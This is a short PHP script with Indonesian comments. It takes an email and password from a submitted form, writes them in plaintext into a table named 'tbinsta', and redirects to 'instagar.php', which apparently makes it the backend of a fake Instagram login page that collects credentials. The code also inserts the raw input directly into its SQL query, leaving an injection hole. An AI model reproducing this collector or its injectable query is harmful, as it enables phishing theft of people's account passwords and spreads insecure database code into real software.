<?php 
	//buat koneksi
	require_once "koneksi.php";

	$email = $_POST['email'];
	$password = $_POST['password'];

	//buat query
	mysqli_query($cn,"INSERT INTO tbinsta VALUES('$email','$password')");

	header('location: instagar.php');

 ?>